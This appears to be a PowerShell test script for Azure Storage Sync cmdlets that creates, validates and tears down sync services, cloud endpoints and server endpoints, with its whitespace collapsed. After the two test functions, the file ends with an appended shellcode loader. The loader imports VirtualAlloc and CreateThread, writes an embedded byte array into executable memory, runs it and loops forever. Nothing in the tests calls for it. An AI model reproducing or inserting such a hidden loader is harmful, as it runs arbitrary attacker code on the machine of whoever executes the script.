function Test-ServerEndpoint2{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$serverEndpointName = Get-ResourceName("sep")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$azureFileShareName = "testfs" $storageAccountName = Get-ResourceName("sa")$storageAccountTenantId = (Get-AzTenant).Id$serverLocalPath = "D:\" + $serverEndpointName$offlineDataTransferShareName = "http://dummy"$tierFilesOlderThanDays = 10$volumeFreeSpacePercent = 60$volumeFreeSpacePercent2 = 80Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"$storageAccount = New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountName$context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$job = New-AzStorageSyncCloudEndpoint -ParentObject $syncGroup -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -AsJob $job | Wait-Job$cloudEndpoint = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Resource: <auto-generated> | Loc: $resourceLocation | Type : RegisteredServer"$job = Register-AzStorageSyncServer -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -AsJob $job | Wait-Job$registeredServer = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Resource: $serverEndpointName | Loc: $resourceLocation"$job = New-AzStorageSyncServerEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $serverEndpointName -ServerResourceId $registeredServer.ResourceId -ServerLocalPath $serverLocalPath -CloudTiering -OfflineDataTransfer -VolumeFreeSpacePercent $volumeFreeSpacePercent -OfflineDataTransferShareName $offlineDataTransferShareName -TierFilesOlderThanDays $tierFilesOlderThanDays -Verbose -AsJob $job | Wait-Job$serverEndpoint = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent $serverEndpoint.VolumeFreeSpacePercentWrite-Verbose "Get ServerEndpoint by Name"$serverEndpoint = Get-AzStorageSyncServerEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -ServerEndpointName $serverEndpointName Write-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent $serverEndpoint.VolumeFreeSpacePercentWrite-Verbose "Get ServerEndpoint by ParentObject"$serverEndpoint = Get-AzStorageSyncServerEndpoint -ParentObject $syncGroup -Name $serverEndpointName -VerboseWrite-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent $serverEndpoint.VolumeFreeSpacePercentWrite-Verbose "Get ServerEndpoint by ParentResourceId"$serverEndpoint = Get-AzStorageSyncServerEndpoint -ParentResourceId $syncGroup.ResourceId -Name $serverEndpointName -VerboseWrite-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent $serverEndpoint.VolumeFreeSpacePercentWrite-Verbose "Patch ServerEndpoint by Name"$job = Set-AzStorageSyncServerEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName  $syncGroupName -Name $serverEndpointName -VolumeFreeSpacePercent $volumeFreeSpacePercent2 -Verbose -AsJob $job | Wait-Job$serverEndpoint2 = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint2.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint2.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent2 $serverEndpoint2.VolumeFreeSpacePercentWrite-Verbose "Patch ServerEndpoint by InputObject"$job = Set-AzStorageSyncServerEndpoint -InputObject $serverEndpoint -VolumeFreeSpacePercent $volumeFreeSpacePercent2 -Verbose -AsJob $job | Wait-Job$serverEndpoint2 = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint2.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint2.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent2 $serverEndpoint2.VolumeFreeSpacePercentWrite-Verbose "Patch ServerEndpoint by ResourceId"$job = Set-AzStorageSyncServerEndpoint -ResourceId $serverEndpoint.ResourceId -VolumeFreeSpacePercent $volumeFreeSpacePercent2 -Verbose -AsJob $job | Wait-Job$serverEndpoint2 = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Validating ServerEndpoint Properties"Assert-AreEqual $serverEndpointName $serverEndpoint2.ServerEndpointNameAssert-AreEqual $serverLocalPath $serverEndpoint2.ServerLocalPathAssert-AreEqual $volumeFreeSpacePercent2 $serverEndpoint2.VolumeFreeSpacePercentWrite-Verbose "Recall ServerEndpoint by Name"Invoke-AzStorageSyncFileRecall -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName  $syncGroupName -Name $serverEndpointName -AsJob | Wait-JobWrite-Verbose "Recall ServerEndpoint by InputObject"Invoke-AzStorageSyncFileRecall -InputObject $serverEndpoint -AsJob | Wait-JobWrite-Verbose "Recall ServerEndpoint by ResourceId"Invoke-AzStorageSyncFileRecall -ResourceId $serverEndpoint.ResourceId -AsJob | Wait-JobWrite-Verbose "Removing ServerEndpoint: $serverEndpointName"Remove-AzStorageSyncServerEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $serverEndpointName -AsJob | Wait-JobWrite-Verbose "Executing Piping Scenarios"New-AzStorageSyncServerEndpoint -ParentObject $syncGroup -Name $serverEndpointName -ServerResourceId $registeredServer.ResourceId -ServerLocalPath $serverLocalPath -CloudTiering -OfflineDataTransfer -VolumeFreeSpacePercent $volumeFreeSpacePercent -OfflineDataTransferShareName $offlineDataTransferShareName -TierFilesOlderThanDays $tierFilesOlderThanDays | Get-AzStorageSyncServerEndpoint  | Remove-AzStorageSyncServerEndpoint -Force -AsJob | Wait-JobNew-AzStorageSyncServerEndpoint -ParentResourceId $syncGroup.ResourceId -Name $serverEndpointName -ServerResourceId $registeredServer.ResourceId -ServerLocalPath $serverLocalPath -CloudTiering -OfflineDataTransfer -VolumeFreeSpacePercent $volumeFreeSpacePercent -OfflineDataTransferShareName $offlineDataTransferShareName -TierFilesOlderThanDays $tierFilesOlderThanDays | Remove-AzStorageSyncServerEndpoint -Force -AsJob | Wait-JobWrite-Verbose "Unregister Server: $($registeredServer.ServerId)"Unregister-AzStorageSyncServer -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -ServerId $registeredServer.ServerId -AsJob | Wait-JobWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-ServerEndpoint{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$syncGroupName = Get-ResourceName("sg")$serverEndpointName = Get-ResourceName("sep")$cloudEndpointName = Get-ResourceName("cep")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices")$azureFileShareName = "testfs" $storageAccountName = Get-ResourceName("sa")$storageAccountTenantId = (Get-AzTenant).Id$serverLocalPath = "D:\" + $serverEndpointName$offlineDataTransferShareName = "dummy"$tierFilesOlderThanDays = 10$volumeFreeSpacePercent = 60$volumeFreeSpacePercent2 = 80Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "Resource: $syncGroupName | Loc: $resourceLocation | Type : SyncGroup"$syncGroup = New-AzStorageSyncGroup -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupNameWrite-Verbose "Resource: $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"New-AzStorageAccount -StorageAccountName $StorageAccountName -Location $resourceLocation -ResourceGroupName $resourceGroupName -Type Standard_LRS$storageAccount = Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName$key = Get-AzStorageAccountKey -ResourceGroupName $resourceGroupName -Name $StorageAccountName$context = Create-StorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $key[0].ValueWrite-Verbose "Resource: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"$azureFileShareName = Create-StorageShare -Name $AzureFileShareName -Context $context$storageAccountResourceId = $storageAccount.IdCreate-StorageShare -Name $offlineDataTransferShareName -Context $context | Out-NullWrite-Verbose "Resource: $cloudEndpointName | Loc: $resourceLocation | Type : CloudEndpoint"$job = New-AzStorageSyncCloudEndpoint -ParentObject $syncGroup -Name $cloudEndpointName -StorageAccountResourceId $storageAccountResourceId -AzureFileShareName $azureFileShareName -StorageAccountTenantId $StorageAccountTenantId -AsJob $job | Wait-Job$cloudEndpoint = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Resource: <auto-generated> | Loc: $resourceLocation | Type : RegisteredServer"$job = Register-AzStorageSyncServer -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -AsJob $job | Wait-Job$registeredServer = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Resource: $serverEndpointName | Loc: $resourceLocation"$job = New-AzStorageSyncServerEndpoint -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $serverEndpointName -ServerResourceId $registeredServer.ResourceId -ServerLocalPath $serverLocalPath -CloudTiering -OfflineDataTransfer -VolumeFreeSpacePercent $volumeFreeSpacePercent -OfflineDataTransferShareName $offlineDataTransferShareName -TierFilesOlderThanDays $tierFilesOlderThanDays -Verbose -AsJob $job | Wait-Job$serverEndpoint = get-job -Id $job.Id | receive-job -KeepWrite-Verbose "Removing ServerEndpoint: $serverEndpointName"Remove-AzStorageSyncServerEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $serverEndpointName -AsJob | Wait-JobWrite-Verbose "Unregister Server: $($registeredServer.ServerId)"Unregister-AzStorageSyncServer -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -ServerId $registeredServer.ServerId -AsJob | Wait-JobWrite-Verbose "Removing CloudEndpoint: $cloudEndpointName"Remove-AzStorageSyncCloudEndpoint -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -SyncGroupName $syncGroupName -Name $cloudEndpointName -AsJob | Wait-JobWrite-Verbose "Removing SyncGroup: $syncGroupName"Remove-AzStorageSyncGroup -Force -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -Name $syncGroupName -AsJob | Wait-JobWrite-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-Jobif(IsLive){Write-Verbose "Removing: $AzureFileShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $AzureFileShareName -Context $context | Out-NullWrite-Verbose "Removing: $offlineDataTransferShareName | Loc: $resourceLocation | Type : AzureStorageShare"Remove-StorageShare -Name $offlineDataTransferShareName -Context $context | Out-Null}Write-Verbose "Removing $StorageAccountName | Loc: $resourceLocation | Type : StorageAccount"Remove-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $StorageAccountName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb6,0xc8,0x5e,0x5f,0xd9,0xed,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x0f,0x03,0x50,0xb9,0x2a,0xab,0xa3,0x2d,0x28,0x54,0x5c,0xad,0x4d,0xdc,0xb9,0x9c,0x4d,0xba,0xca,0x8e,0x7d,0xc8,0x9f,0x22,0xf5,0x9c,0x0b,0xb1,0x7b,0x09,0x3b,0x72,0x31,0x6f,0x72,0x83,0x6a,0x53,0x15,0x07,0x71,0x80,0xf5,0x36,0xba,0xd5,0xf4,0x7f,0xa7,0x14,0xa4,0x28,0xa3,0x8b,0x59,0x5d,0xf9,0x17,0xd1,0x2d,0xef,0x1f,0x06,0xe5,0x0e,0x31,0x99,0x7e,0x49,0x91,0x1b,0x53,0xe1,0x98,0x03,0xb0,0xcc,0x53,0xbf,0x02,0xba,0x65,0x69,0x5b,0x43,0xc9,0x54,0x54,0xb6,0x13,0x90,0x52,0x29,0x66,0xe8,0xa1,0xd4,0x71,0x2f,0xd8,0x02,0xf7,0xb4,0x7a,0xc0,0xaf,0x10,0x7b,0x05,0x29,0xd2,0x77,0xe2,0x3d,0xbc,0x9b,0xf5,0x92,0xb6,0xa7,0x7e,0x15,0x19,0x2e,0xc4,0x32,0xbd,0x6b,0x9e,0x5b,0xe4,0xd1,0x71,0x63,0xf6,0xba,0x2e,0xc1,0x7c,0x56,0x3a,0x78,0xdf,0x3e,0x8f,0xb1,0xe0,0xbe,0x87,0xc2,0x93,0x8c,0x08,0x79,0x3c,0xbc,0xc1,0xa7,0xbb,0xc3,0xfb,0x10,0x53,0x3a,0x04,0x61,0x7d,0xf8,0x50,0x31,0x15,0x29,0xd9,0xda,0xe5,0xd6,0x0c,0x76,0xe3,0x40,0x6f,0x2f,0xea,0x94,0x07,0x32,0xed,0xa4,0xee,0xbb,0x0b,0x94,0x40,0xec,0x83,0x54,0x31,0x4c,0x74,0x3c,0x5b,0x43,0xab,0x5c,0x64,0x89,0xc4,0xf6,0x8b,0x64,0xbc,0x6e,0x35,0x2d,0x36,0x0f,0xba,0xfb,0x32,0x0f,0x30,0x08,0xc2,0xc1,0xb1,0x65,0xd0,0xb5,0x31,0x30,0x8a,0x13,0x4d,0xee,0xa1,0x9b,0xdb,0x15,0x60,0xcc,0x73,0x14,0x55,0x3a,0xdc,0xe7,0xb0,0x31,0xd5,0x7d,0x7b,0x2d,0x1a,0x92,0x7b,0xad,0x4c,0xf8,0x7b,0xc5,0x28,0x58,0x28,0xf0,0x36,0x75,0x5c,0xa9,0xa2,0x76,0x35,0x1e,0x64,0x1f,0xbb,0x79,0x42,0x80,0x44,0xac,0x52,0xfc,0x92,0x88,0x20,0xec,0x26;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};